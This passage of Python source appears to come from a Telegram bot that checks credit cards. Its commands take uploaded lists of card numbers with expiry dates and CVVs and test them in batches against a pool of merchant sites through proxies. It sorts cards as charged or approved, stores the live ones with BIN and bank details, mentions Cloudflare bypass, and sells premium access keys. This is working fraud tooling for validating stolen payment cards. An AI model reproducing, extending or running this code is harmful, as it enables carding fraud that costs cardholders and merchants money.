𝙏𝙤𝙩𝙖𝙡 𝘾𝙝𝙚𝙘𝙠𝙚𝙙 ☠️ : {checked}/{total}
"""
                        final_buttons = [[Button.inline(f"𝘾𝙃𝘼𝙍𝙂𝙀 ➜ [ {charged} ] 💎", b"none")], [Button.inline(f"𝘼𝙥𝙥𝙧𝙤𝙫𝙚 ➜ [ {approved} ] 🔥", b"none")], [Button.inline(f"𝘿𝙚𝙖𝙙 𝙎𝙞𝙩𝙚𝙨! ➜ [{checked}/{total}] ⛔", b"none")]]
                        try:
                            await status_msg.edit(final_caption, buttons=final_buttons)
                        except:
                            pass
                        ACTIVE_MTXT_PROCESSES.pop(user_id, None)
                        return
                    continue
                if "3d" in response_text_lower:
                    declined += 1
                    continue
                brand, bin_type, level, bank, country, flag = await get_bin_info(card.split("|")[0])
                should_send_message = False
                status_text_lower = res.get("Status", "").lower()
                if "charged" in response_text_lower or "charged" in status_text_lower:
                    charged += 1
                    status_header = "𝘾𝙃𝘼𝙍𝙂𝙀𝘿 💎"
                    await save_approved_card(card, "CHARGED", res.get('Response'), res.get('Gateway'), res.get('Price'))
                    should_send_message = True
                elif "cloudflare bypass failed" in response_text_lower:
                    status_header = "𝘾𝙇𝙊𝙐𝘿𝙁𝙇𝘼𝙍𝙀 𝙎𝙋𝙊𝙏𝙏𝙀𝘿 ⚠️"
                    res["Response"] = "Cloudflare spotted 🤡 change site or try again"
                    checked -= 1
                elif "thank you" in response_text_lower or "payment successful" in response_text_lower:
                    charged += 1
                    status_header = "𝘾𝙃𝘼𝙍𝙂𝙀𝘿 💎"
                    await save_approved_card(card, "CHARGED", res.get('Response'), res.get('Gateway'), res.get('Price'))
                    should_send_message = True
                elif any(key in response_text_lower for key in ["invalid_cvv", "incorrect_cvv", "insufficient_funds", "approved", "success", "invalid_cvc", "incorrect_cvc", "incorrect_zip", "insufficient funds"]):
                    approved += 1
                    status_header = "𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅"
                    await save_approved_card(card, "APPROVED", res.get('Response'), res.get('Gateway'), res.get('Price'))
                    should_send_message = True
                else:
                    declined += 1
                    status_header = "~~ 𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 ~~ ❌"
                site_display = site_index if site_index > 0 else "?"
                if should_send_message:
                    card_msg = f"""{status_header}

𝗖𝗖 ⇾ `{card}`
𝗚𝗮𝘁𝗲𝙬𝙖𝙮 ⇾ {res.get('Gateway', 'Unknown')}
𝗥𝗲𝙨𝙥𝙤𝙣𝙨𝗲 ⇾ {res.get('Response')}
𝗣𝗿𝗶𝗰𝗲 ⇾ {res.get('Price')} 💸
𝗦𝗶𝘁𝗲 ⇾ {site_display}

```𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {brand} - {bin_type} - {level}
𝗕𝗮𝗻𝗸: {bank}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country} {flag}```

𝗧𝗼𝗼𝙠 {elapsed_time} 𝘀𝗲𝗰𝗼𝗻𝗱𝙨
"""
                    result_msg = await event.reply(card_msg)
                    if "charged" in response_text_lower or "charged" in status_text_lower or "thank you" in response_text_lower or "payment successful" in response_text_lower:
                        await pin_charged_message(event, result_msg)
                buttons = [
                    [Button.inline(f"𝗖𝗮𝗿𝗱 ➜ {card[:12]}****", b"none")],
                    [Button.inline(f"𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ➜ {res.get('Response')[:25]}...", b"none")],
                    [Button.inline(f"𝗦𝗶𝘁𝗲 ➜ [ {site_display} ]", b"none")],
                    [Button.inline(f"𝘾𝙃𝘼𝙍𝙂𝙀 ➜ [ {charged} ] 💎", b"none")],
                    [Button.inline(f"𝘼𝙥𝙥𝙧𝙤𝙫𝙚 ➜ [ {approved} ] 🔥", b"none")],
                    [Button.inline(f"𝘿𝙚𝙘𝙡𝙞𝙣𝙚 ➜ [ {declined} ] ❌", b"none")],
                    [Button.inline(f"𝙋𝙧𝙤𝙜𝙧𝙚𝙨𝙨 ➜ [{checked}/{total}] ✅", b"none")],
                    [Button.inline("⛔ 𝙎𝙩𝙤𝙥", f"stop_mtxt:{user_id}".encode())]
                ]
                try:
                    await status_msg.edit("```𝘾𝙤𝙤𝙠𝙞𝙣𝙜 🍳 𝘾𝘾𝙨 𝙊𝙣𝙚 𝙗𝙮 𝙊𝙣𝙚...```", buttons=buttons)
                except:
                    pass
        final_caption = f"""✅ 𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝘾𝙤𝙢𝙥𝙡𝙚𝙩𝙚!
𝙏𝙤𝙩𝙖𝙡 𝘾𝙃𝘼𝙍𝙂𝙀 💎 : {charged}
𝙏𝙤𝙩𝙖𝙡 𝘼𝙥𝙥𝙧𝙤𝙫𝙚 🔥 : {approved}
𝙏𝙤𝙩𝙖𝙡 𝘿𝙚𝙘𝙡𝙞𝙣𝙚 ❌ : {declined}
𝙏𝙤𝙩𝙖𝙡 𝘾𝙝𝙚𝙘𝙠𝙚𝙙 ☠️ : {total}
"""
        final_buttons = [[Button.inline(f"𝘾𝙃𝘼𝙍𝙂𝙀 ➜ [ {charged} ] 💎", b"none")], [Button.inline(f"𝘼𝙥𝙥𝙧𝙤𝙫𝙚 ➜ [ {approved} ] 🔥", b"none")], [Button.inline(f"𝙏𝙤𝙩𝙖𝙡 ➜ [{total}] ☠️", b"none")], [Button.inline(f"𝙏𝙤𝙩𝙖𝙡 𝘾𝙝𝙚𝙘𝙠𝙚𝙙 ➜ [{checked}/{total}] ✅", b"none")]]
        try:
            await status_msg.edit(final_caption, buttons=final_buttons)
        except:
            pass
    finally:
        ACTIVE_MTXT_PROCESSES.pop(user_id, None)

@client.on(events.CallbackQuery(pattern=rb"stop_mtxt:(\d+)"))
async def stop_mtxt_callback(event):
    try:
        match = event.pattern_match
        process_user_id = int(match.group(1).decode())
        clicking_user_id = event.sender_id
        can_stop = False
        if clicking_user_id == process_user_id:
            can_stop = True
        elif clicking_user_id in ADMIN_ID:
            can_stop = True
        if not can_stop:
            return await event.answer("```❌ 𝙔𝙤𝙪 𝙘𝙖𝙣 𝙤𝙣𝙡𝙮 𝙨𝙩𝙤𝙥 𝙮𝙤𝙪𝙧 𝙤𝙬𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨!```", alert=True)
        if process_user_id not in ACTIVE_MTXT_PROCESSES:
            return await event.answer("```❌ 𝙉𝙤 𝙖𝙘𝙩𝙞𝙫𝙚 𝙥𝙧𝙤𝙘𝙚𝙨𝙨 𝙛𝙤𝙪𝙣𝙙!```", alert=True)
        ACTIVE_MTXT_PROCESSES.pop(process_user_id, None)
        await event.answer("```⛔ 𝘾𝘾 𝙘𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙨𝙩𝙤𝙥𝙥𝙚𝙙!```", alert=True)
    except Exception as e:
        await event.answer(f"```❌ 𝙀𝙧𝙧𝙤𝙧: {str(e)}```", alert=True)

# ── Info Command ──

@client.on(events.NewMessage(pattern='/info'))
async def info(event):
    if await is_banned_user(event.sender_id):
        return await event.reply(banned_user_message())
    user = await event.get_sender()
    user_id = event.sender_id
    first_name = user.first_name or "𝙉/𝘼"
    last_name = user.last_name or ""
    full_name = f"{first_name} {last_name}".strip()
    username = f"@{user.username}" if user.username else "𝙉/𝘼"
    has_premium = await is_premium_user(user_id)
    premium_status = "✅ 𝙋𝙧𝙚𝙢𝙞𝙪𝙢 𝘼𝙘𝙘𝙚𝙨𝙨" if has_premium else "❌ 𝙉𝙤 𝙋𝙧𝙚𝙢𝙞𝙪𝙢 𝘼𝙘𝙘𝙚𝙨𝙨"
    sites = await load_json(SITE_FILE)
    user_sites = sites.get(str(user_id), [])
    if user_sites:
        sites_text = "\n".join([f"{idx + 1}. {site}" for idx, site in enumerate(user_sites)])
    else:
        sites_text = "𝙉𝙤 𝙨𝙞𝙩𝙚𝙨 𝙖𝙙𝙙𝙚𝙙"
    info_text = f"""👤 𝙐𝙨𝙚𝙧 𝙄𝙣𝙛𝙤𝙧𝙢𝙖𝙩𝙞𝙤𝙣

𝙉𝙖𝙢𝙚 ⇾ {full_name}
𝙐𝙨𝙚𝙧𝙣𝙖𝙢𝙚 ⇾ {username}
𝙐𝙨𝙚𝙧 𝙄𝘿 ⇾ `{user_id}`
𝙋𝙧  𝙞𝙫𝙖𝙩𝙚 𝘼𝙘𝙘𝙚𝙨𝙨 ⇾ {premium_status}

𝙎𝙞𝙩𝙚𝙨 ⇾ ({len(user_sites)}):

```

{sites_text}

```
"""
    await event.reply(info_text)

# ── Stats Command ──

@client.on(events.NewMessage(pattern='/stats'))
async def stats(event):
    if event.sender_id not in ADMIN_ID:
        return await event.reply("🚫 𝙊𝙣𝙡𝙮 𝘼𝙙𝙢𝙞𝙣 𝘾𝙖𝙣 𝙐𝙨𝙚 𝙏𝙝𝙞𝙨 𝘾𝙤𝙢𝙢𝙖𝙣𝙙!")
    try:
        premium_users = await load_json(PREMIUM_FILE)
        free_users = await load_json(FREE_FILE)
        user_sites = await load_json(SITE_FILE)
        keys_data = await load_json(KEYS_FILE)
        stats_content = "🔥 BOT STATISTICS REPORT 🔥\n"
        stats_content += "=" * 50 + "\n\n"
        current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        stats_content += f"📅 Generated on: {current_time}\n\n"
        stats_content += "👥 USER STATISTICS\n"
        stats_content += "-" * 30 + "\n"
        all_user_ids = set()
        all_user_ids.update(premium_users.keys())
        all_user_ids.update(free_users.keys())
        all_user_ids.update(user_sites.keys())
        total_users = len(all_user_ids)
        total_premium = len(premium_users)
        total_free = total_users - total_premium
        stats_content += f"📊 Total Unique Users: {total_users}\n"
        stats_content += f"💎 Premium Users: {total_premium}\n"
        stats_content += f"🆓 Free Users: {total_free}\n\n"
        if premium_users:
            stats_content += "💎 PREMIUM USERS DETAILS\n"
            stats_content += "-" * 30 + "\n"
            for user_id, user_data in premium_users.items():
                expiry_date = datetime.datetime.fromisoformat(user_data['expiry'])
                current_date = datetime.datetime.now()
                status = "ACTIVE" if current_date <= expiry_date else "EXPIRED"
                days_remaining = (expiry_date - current_date).days if current_date <= expiry_date else 0
                stats_content += f"User ID: {user_id}\n"
                stats_content += f"  Status: {status}\n"
                stats_content += f"  Days Given: {user_data.get('days', 'N/A')}\n"
                stats_content += f"  Added By: {user_data.get('added_by', 'N/A')}\n"
                stats_content += f"  Expires: {expiry_date.strftime('%Y-%m-%d %H:%M:%S')}\n"
                stats_content += f"  Days Remaining: {days_remaining}\n"
                stats_content += "-" * 20 + "\n"
        stats_content += "\n🌐 SITES STATISTICS\n"
        stats_content += "-" * 30 + "\n"
        total_sites_count = sum(len(sites) for sites in user_sites.values())
        users_with_sites = len([uid for uid, sites in user_sites.items() if sites])
        stats_content += f"📈 Total Sites Added: {total_sites_count}\n"
        stats_content += f"👤 Users with Sites: {users_with_sites}\n"
        if user_sites:
            stats_content += f"\nSites per User:\n"
            for user_id, sites in user_sites.items():
                if sites:
                    stats_content += f"  User {user_id}: {len(sites)} sites\n"
                    for site in sites:
                        stats_content += f"    - {site}\n"
        stats_content += f"\n🔑 KEYS STATISTICS\n"
        stats_content += "-" * 30 + "\n"
        total_keys = len(keys_data)
        used_keys = len([k for k, v in keys_data.items() if v.get('used', False)])
        unused_keys = total_keys - used_keys
        stats_content += f"🔢 Total Keys Generated: {total_keys}\n"
        stats_content += f"✅ Used Keys: {used_keys}\n"
        stats_content += f"⏳ Unused Keys: {unused_keys}\n"
        if keys_data:
            stats_content += f"\nKeys Details:\n"
            for key, key_data in keys_data.items():
                status = "USED" if key_data.get('used', False) else "UNUSED"
                used_by = key_data.get('used_by', 'N/A')
                days = key_data.get('days', 'N/A')
                created = key_data.get('created_at', 'N/A')
                used_at = key_data.get('used_at', 'N/A')
                stats_content += f"  Key: {key}\n"
                stats_content += f"    Status: {status}\n"
                stats_content += f"    Days Value: {days}\n"
                stats_content += f"    Created: {created}\n"
                if status == "USED":
                    stats_content += f"    Used By: {used_by}\n"
                    stats_content += f"    Used At: {used_at}\n"
                stats_content += "-" * 15 + "\n"
        stats_content += f"\n👑 ADMIN STATISTICS\n"
        stats_content += "-" * 30 + "\n"
        stats_content += f"🛡️ Total Admins: {len(ADMIN_ID)}\n"
        stats_content += f"Admin IDs: {', '.join(map(str, ADMIN_ID))}\n"
        if os.path.exists(CC_FILE):
            try:
                async with aiofiles.open(CC_FILE, "r", encoding="utf-8") as f:
                    cc_content = await f.read()
                cc_lines = cc_content.strip().split('\n') if cc_content.strip() else []
                approved_cards = len([line for line in cc_lines if 'APPROVED' in line])
                charged_cards = len([line for line in cc_lines if 'CHARGED' in line])
                stats_content += f"\n💳 CARD STATISTICS\n"
                stats_content += "-" * 30 + "\n"
                stats_content += f"📊 Total Processed Cards: {len(cc_lines)}\n"
                stats_content += f"✅ Approved Cards: {approved_cards}\n"
                stats_content += f"💎 Charged Cards: {charged_cards}\n"
            except:
                pass
        stats_content += "\n" + "=" * 50 + "\n"
        stats_content += "📋 END OF REPORT 📋"
        stats_filename = f"bot_stats_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        async with aiofiles.open(stats_filename, "w", encoding="utf-8") as f:
            await f.write(stats_content)
        await event.reply("📊 𝘽𝙤𝙩 𝙨𝙩𝙖𝙩𝙞𝙨𝙩𝙞𝙘𝙨 𝙧𝙚𝙥𝙤𝙧𝙩 𝙜𝙚𝙣𝙚𝙧𝙖𝙩𝙚𝙙!", file=stats_filename)
        os.remove(stats_filename)
    except Exception as e:
        await event.reply(f"❌ 𝙀𝙧𝙧𝙤𝙧 𝙜𝙚𝙣𝙚𝙧𝙖𝙩𝙞𝙣𝙜 𝙨𝙩𝙖𝙩𝙨: {e}")

# ── Random Site Check from TXT (/ran) ──

@client.on(events.NewMessage(pattern=r'(?i)^[/.]ran$'))
async def ranfor(event):
    can_access, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned":
        return await event.reply(banned_user_message())
    if not can_access:
        buttons = [[Button.url("𝙐𝙨𝙚 𝙄𝙣 𝙂𝙧𝙤𝙪𝙥 𝙁𝙧𝙚𝙚", f"https://t.me/+pNplrRLrEGY5NTU0")]]
        return await event.reply("🚫 𝙐𝙣𝙖𝙪𝙩𝙝𝙤𝙧𝙞𝙨𝙚𝙙 𝘼𝙘𝙘𝙚𝙨𝙨!\n\n𝙔𝙤𝙪 𝙘𝙖𝙣 𝙪𝙨𝙚 𝙩𝙝𝙞𝙨 𝙗𝙤𝙩 𝙞𝙣 𝙜𝙧𝙤𝙪𝙥 𝙛𝙤𝙧 𝙛𝙧𝙚𝙚!\n\n𝙁𝙤𝙧 𝙥𝙧𝙞𝙫𝙖𝙩𝙚 𝙖𝙘𝙘𝙚𝙨𝙨, 𝙘𝙤𝙣𝙩𝙖𝙘𝙩 @𝙈𝙤𝙙_𝘽𝙮_𝙆𝙖𝙢𝙖𝙡", buttons=buttons)
    proxy_data = await get_user_proxy(event.sender_id)
    if not proxy_data:
        return await event.reply("⚠️ 𝙋𝙧𝙤𝙭𝙮 𝙍𝙚𝙦𝙪𝙞𝙧𝙚𝙙!\n\n𝙋𝙡𝙚𝙖𝙨𝙚 𝙖𝙙𝙙 𝙖 𝙥𝙧𝙤𝙭𝙮 𝙛𝙞𝙧𝙨𝙩 𝙪𝙨𝙞𝙣𝙜:\n`/addpxy ip:port:username:password`\n\n𝙊𝙧 𝙬𝙞𝙩𝙝𝙤𝙪𝙩 𝙖𝙪𝙩𝙝:\n`/addpxy ip:port`")
    user_id = event.sender_id
    if user_id in ACTIVE_MTXT_PROCESSES:
        return await event.reply("```𝙔𝙤𝙪𝙧 𝘾𝘾 is 𝙖𝙡𝙧𝙚𝙖𝙙𝙮 𝘾𝙤𝙤𝙠𝙞𝙣𝙜 🍳 𝙬𝙖𝙞𝙩 𝙛𝙤𝙧 𝙘𝙤𝙢𝙥𝙡𝙚𝙩𝙚```")
    try:
        if not event.reply_to_msg_id:
            return await event.reply("```𝙋𝙡𝙚𝙖𝙨𝙚 𝙧𝙚𝙥𝙡𝙮 𝙩𝙤 𝙖 𝙙𝙤𝙘𝙪𝙢𝙚𝙣𝙩 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙬𝙞𝙩𝙝 /𝙧𝙖𝙣```")
        replied_msg = await event.get_reply_message()
        if not replied_msg or not replied_msg.document:
            return await event.reply("```𝙋𝙡𝙚𝙖𝙨𝙚 𝙧𝙚𝙥𝙡𝙮 𝙩𝙤 𝙖 𝙙𝙤𝙘𝙪𝙢𝙚𝙣𝙩 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙬𝙞𝙩𝙝 /𝙧𝙖𝙣```")
        if not os.path.exists('sites.txt'):
            return await event.reply("❌ 𝙎𝙞𝙩𝙚𝙨 𝙛𝙞𝙡𝙚 𝙣𝙤𝙩 𝙛𝙤𝙪𝙣𝙙! 𝘾𝙤𝙣𝙩𝙖𝙘𝙩 𝙖𝙙𝙢𝙞𝙣.")
        async with aiofiles.open('sites.txt', 'r') as f:
            sites_content = await f.read()
            global_sites = [line.strip() for line in sites_content.splitlines() if line.strip()]
        if not global_sites:
            return await event.reply("❌ 𝙉𝙤 𝙨𝙞𝙩𝙚𝙨 𝙖𝙫𝙖𝙞𝙡𝙖𝙗𝙡𝙚 𝙞𝙣 𝙨𝙞𝙩𝙚𝙨.𝙩𝙭𝙩! 𝘾𝙤𝙣𝙩𝙖𝙘𝙩 𝙖𝙙𝙢𝙞𝙣.")
        file_path = await replied_msg.download_media()
        try:
            async with aiofiles.open(file_path, "r") as f:
                lines = (await f.read()).splitlines()
            os.remove(file_path)
        except Exception as e:
            try:
                os.remove(file_path)
            except:
                pass
            return await event.reply(f"❌ 𝙀𝙧𝙧𝙤𝙧 𝙧𝙚𝙖𝙙𝙞𝙣𝙜 𝙛𝙞𝙡𝙚: {e}")
        cards = [line for line in lines if re.match(r'\d{12,16}\|\d{1,2}\|\d{2,4}\|\d{3,4}', line)]
        if not cards:
            return await event.reply("𝘼𝙣𝙮 𝙑𝙖𝙡𝙞𝙙 𝘾𝘾 𝙣𝙤𝙩 𝙁𝙤𝙪𝙣𝙙 🥲")
        cc_limit = get_cc_limit(access_type, user_id)
        total_cards_found = len(cards)
        if len(cards) > cc_limit:
            cards = cards[:cc_limit]
            await event.reply(f"""```📝 𝙁𝙤𝙪𝙣𝙙 {total_cards_found} 𝘾𝘾𝙨 𝙞𝙣 𝙛𝙞𝙡𝙚
⚠️ 𝙋𝙧𝙤𝙘𝙚𝙨𝙨𝙞𝙣𝙜 𝙤𝙣𝙡𝙮 𝙛𝙞𝙧𝙨𝙩 {cc_limit} 𝘾𝘾𝙨 (𝙮𝙤𝙪𝙧 𝙡𝙞𝙢𝙞𝙩)
🔥 {len(cards)} 𝘾𝘾𝙨 𝙬𝙞𝙡𝙡 𝙗𝙚 𝙘𝙝𝙚𝙘𝙠𝙚𝙙```""")
        else:
            await event.reply(f"""```📝 𝙁𝙤𝙪𝙣𝙙 {total_cards_found} 𝙫𝙖𝙡𝙞𝙙 𝘾𝘾𝙨 𝙞𝙣 𝙛𝙞𝙡𝙚
🔥 𝘼𝙡𝙡 {len(cards)} 𝘾𝘾𝙨 𝙬𝙞𝙡𝙡 𝙗𝙚 𝙘𝙝𝙚𝙘𝙠𝙚𝙙```""")
        ACTIVE_MTXT_PROCESSES[user_id] = True
        asyncio.create_task(process_ranfor_cards(event, cards, global_sites.copy()))
    except Exception as e:
        ACTIVE_MTXT_PROCESSES.pop(user_id, None)
        await event.reply(f"❌ 𝙀𝙧𝙧𝙤𝙧: {e}")

async def process_ranfor_cards(event, cards, global_sites):
    user_id = event.sender_id
    total = len(cards)
    checked, approved, charged, declined = 0, 0, 0, 0
    status_msg = await event.reply(f"```𝙎𝙤మె𝙩𝙝𝙞𝙣𝙜 𝘽𝙞𝙜 𝘾𝙤𝙤𝙠𝙞𝙣𝙜 🍳```")
    sem = get_semaphore(user_id, 'msp', MSP_PER_USER_WORKERS)
    try:
        batch_size = BATCH_SIZE
        for i in range(0, len(cards), batch_size):
            if not global_sites:
                await status_msg.edit("❌ **All sites are dead!**\nPlease contact admin to add fresh sites.")
                break
            batch = cards[i:i+batch_size]
            tasks = []
            task_cards = []
            if user_id not in ACTIVE_MTXT_PROCESSES:
                final_caption = f"""⛔ 𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙎𝙩𝙤𝙥𝙥𝙚𝙙!
𝙏𝙤𝙩𝙖𝙡 𝘾𝙃𝘼𝙍𝙂𝙀 💎 : {charged}
𝙏𝙤𝙩𝙖𝙡 𝘼𝙥𝙥𝙧𝙤𝙫𝙚 🔥 : {approved}
𝙏𝙤𝙩𝙖𝙡 𝘿𝙚𝙘𝙡𝙞𝙣𝙚 ❌ : {declined}
𝙏𝙤𝙩𝙖𝙡 𝘾𝙝𝙚𝙘𝙠𝙚𝙙 ☠️ : {checked}/{total}
"""
                final_buttons = [[Button.inline(f"𝘾𝙃𝘼𝙍𝙂𝙀 ➜ [ {charged} ] 💎", b"none")], [Button.inline(f"𝘼𝙥𝙥𝙧𝙤𝙫𝙚 ➜ [ {approved} ] 🔥", b"none")], [Button.inline(f"𝙎𝙩𝙤𝙥 ➜ [{checked}/{total}] ⛔", b"none")]]
                try:
                    await status_msg.edit(final_caption, buttons=final_buttons)
                except:
                    pass
                return
            for card in batch:
                if user_id not in ACTIVE_MTXT_PROCESSES or not global_sites:
                    break
                tasks.append(
                    asyncio.create_task(
                        _run_with_semaphore(sem, check_card_with_retry, card, global_sites, user_id)
                    )
                )
                task_cards.append(card)
            if not tasks:
                continue
            results = await asyncio.gather(*tasks, return_exceptions=True)
            for j, (card, result) in enumerate(zip(task_cards, results)):
                if user_id not in ACTIVE_MTXT_PROCESSES:
                    break
                if isinstance(result, Exception):
                    result = ({"Response": f"Exception: {str(result)}", "Price": "-", "Gateway": "-"}, -1, None)
                res, site_index, used_site = result
                checked += 1
                start_time = time.time()
                end_time = time.time()
                elapsed_time = round(end_time - start_time, 2)
                response_text = res.get("Response", "")
                response_text_lower = response_text.lower()
                if is_site_dead(response_text):
                    declined += 1
                    continue
                if "3d" in response_text_lower:
                    declined += 1
                    continue
                brand, bin_type, level, bank, country, flag = await get_bin_info(card.split("|")[0])
                should_send_message = False
                status_text_lower = res.get("Status", "").lower()
                if "charged" in response_text_lower or "charged" in status_text_lower:
                    charged += 1
                    status_header = "𝘾𝙃𝘼𝙍𝙂𝙀𝘿 💎"
                    await save_approved_card(card, "CHARGED", res.get('Response'), res.get('Gateway'), res.get('Price'))
                    should_send_message = True
                elif "cloudflare bypass failed" in response_text_lower:
                    status_header = "𝘾𝙇𝙊𝙐𝘿𝙁𝙇𝘼𝙍𝙀 𝙎𝙋𝙊𝙏𝙏𝙀𝘿 ⚠️"
                    res["Response"] = "Cloudflare spotted 🤡 change site or try again"
                    checked -= 1
                elif "thank you" in response_text_lower or "payment successful" in response_text_lower:
                    charged += 1
                    status_header = "𝘾𝙃𝘼𝙍𝙂𝙀𝘿 💎"
                    await save_approved_card(card, "CHARGED", res.get('Response'), res.get('Gateway'), res.get('Price'))
                    should_send_message = True
                elif any(key in response_text_lower for key in ["invalid_cvv", "incorrect_cvv", "insufficient_funds", "approved", "success", "invalid_cvc", "incorrect_cvc", "incorrect_zip", "insufficient funds"]):
                    approved += 1
                    status_header = "𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅"
                    await save_approved_card(card, "APPROVED", res.get('Response'), res.get('Gateway'), res.get('Price'))
                    should_send_message = True
                else:
                    declined += 1
                    status_header = "~~ 𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 ~~ ❌"
                site_display = site_index if site_index > 0 else "?"
                if should_send_message:
                    card_msg = f"""{status_header}

𝗖𝗖 ⇾ `{card}`
𝗚𝗮𝘁𝗲𝙬𝙖𝙮 ⇾ {res.get('Gateway', 'Unknown')}
𝗥𝗲𝙨𝙥𝙤𝙣𝙨𝗲 ⇾ {res.get('Response')}
𝗣𝗿𝗶𝗰𝗲 ⇾ {res.get('Price')} 💸
𝗦𝗶𝘁𝗲 ⇾ {site_display}

```𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {brand} - {bin_type} - {level}
𝗕𝗮𝗻𝗸: {bank}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country} {flag}```

𝗧𝗼𝗼𝙠 {elapsed_time} 𝘀𝗲𝗰𝗼𝗻𝗱𝙨
"""
                    result_msg = await event.reply(card_msg)
                    if "charged" in response_text_lower or "charged" in status_text_lower or "thank you" in response_text_lower or "payment successful" in response_text_lower:
                        await pin_charged_message(event, result_msg)
                buttons = [
                    [Button.inline(f"𝗖𝗮𝗿𝗱 ➜ {card[:12]}****", b"none")],
                    [Button.inline(f"𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ➜ {res.get('Response')[:25]}...", b"none")],
                    [Button.inline(f"𝘾𝙃𝘼𝙍𝙂𝙀 ➜ [ {charged} ] 💎", b"none")],
                    [Button.inline(f"𝘼𝙥𝙥𝙧𝙤𝙫𝙚 ➜ [ {approved} ] 🔥", b"none")],
                    [Button.inline(f"𝘿𝙚𝙘𝙡𝙞𝙣𝙚 ➜ [ {declined} ] ❌", b"none")],
                    [Button.inline(f"𝙋𝙧𝙤𝙜𝙧𝙚𝙨𝙨 ➜ [{checked}/{total}] ✅", b"none")],
                    [Button.inline("⛔ 𝙎𝙩𝙤𝙥", f"stop_ranfor:{user_id}".encode())]
                ]
                try:
                    await status_msg.edit("```𝘾𝙤𝙤𝙠𝙞𝙣𝙜 🍳 𝘾𝘾𝙨 𝙊𝙣𝙚 𝙗𝙮 𝙊𝙣𝙚...```", buttons=buttons)
                except:
                    pass
        final_caption = f"""✅ 𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝘾𝙤𝙢𝙥𝙡𝙚𝙩𝙚!
𝙏𝙤𝙩𝙖𝙡 𝘾𝙃𝘼𝙍𝙂𝙀 💎 : {charged}
𝙏𝙤𝙩𝙖𝙡 𝘼𝙥𝙥𝙧𝙤𝙫𝙚 🔥 : {approved}
𝙏𝙤𝙩𝙖𝙡 𝘿𝙚𝙘𝙡𝙞𝙣𝙚 ❌ : {declined}
𝙏𝙤𝙩𝙖𝙡 𝘾𝙝𝙚𝙘𝙠𝙚𝙙 ☠️ : {total}
"""
        final_buttons = [[Button.inline(f"𝘾𝙃𝘼𝙍𝙂𝙀 ➜ [ {charged} ] 💎", b"none")], [Button.inline(f"𝘼𝙥𝙥𝙧𝙤𝙫𝙚 ➜ [ {approved} ] 🔥", b"none")], [Button.inline(f"𝙏𝙤𝙩𝙖𝙡 ➜ [{total}] ☠️", b"none")], [Button.inline(f"𝙏𝙤𝙩𝙖𝙡 𝘾𝙝𝙚𝙘𝙠𝙚𝙙 ➜ [{checked}/{total}] ✅", b"none")]]
        try:
            await status_msg.edit(final_caption, buttons=final_buttons)
        except:
            pass
    finally:
        ACTIVE_MTXT_PROCESSES.pop(user_id, None)

@client.on(events.CallbackQuery(pattern=rb"stop_ranfor:(\d+)"))
async def stop_ranfor_callback(event):
    try:
        match = event.pattern_match
        process_user_id = int(match.group(1).decode())
        clicking_user_id = event.sender_id
        can_stop = False
        if clicking_user_id == process_user_id:
            can_stop = True
        elif clicking_user_id in ADMIN_ID:
            can_stop = True
        if not can_stop:
            return await event.answer("```❌ 𝙔𝙤𝙪 𝙘𝙖𝙣 𝙤𝙣𝙡𝙮 𝙨𝙩𝙤𝙥 𝙮𝙤𝙪𝙧 𝙤𝙬𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨!```", alert=True)
        if process_user_id not in ACTIVE_MTXT_PROCESSES:
            return await event.answer("```❌ 𝙉𝙤 𝙖𝙘𝙩𝙞𝙫𝙚 𝙥𝙧𝙤𝙘𝙚𝙨𝙨 𝙛𝙤𝙪𝙣𝙙!```", alert=True)
        ACTIVE_MTXT_PROCESSES.pop(process_user_id, None)
        await event.answer("```⛔ 𝘾𝘾 𝙘𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙨𝙩𝙤𝙥𝙥𝙚𝙙!```", alert=True)
    except Exception as e:
        await event.answer(f"```❌ 𝙀𝙧𝙧𝙤𝙧: {str(e)}```", alert=True)

# ── Site Check (/check) ──
# FIXED: Continues on proxy dead instead of stopping

@client.on(events.NewMessage(pattern=r'(?i)^[/.]check'))
async def check_sites(event):
    can_access, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned":
        return await event.reply(banned_user_message())
    if not can_access:
        buttons = [[Button.url("𝙐𝙨𝙚 𝙄𝙣 𝙂𝙧𝙤𝙪𝙥 𝙁𝙧𝙚𝙚", f"https://t.me/+pNplrRLrEGY5NTU0")]]
        return await event.reply("🚫 𝙐𝙣𝙖𝙪𝙩𝙝𝙤𝙧𝙞𝙨𝙚𝙙 𝘼𝙘𝙘𝙚𝙨𝙨!\n\n𝙔𝙤𝙪 𝙘𝙖𝙣 𝙪𝙨𝙚 𝙩𝙝𝙞𝙨 𝙗𝙤𝙩 𝙞𝙣 𝙜𝙧𝙤𝙪𝙥 𝙛𝙤𝙧 𝙛𝙧𝙚𝙚!\n\n𝙁𝙤𝙧 𝙥𝙧𝙞𝙫𝙖𝙩𝙚 𝙖𝙘𝙘𝙚𝙨𝙨, 𝙘𝙤𝙣𝙩𝙖𝙘𝙩 @𝙈𝙤𝙙_𝘽𝙮_𝙆𝙖𝙢𝙖𝙡", buttons=buttons)
    proxy_data = await get_user_proxy(event.sender_id)
    if not proxy_data:
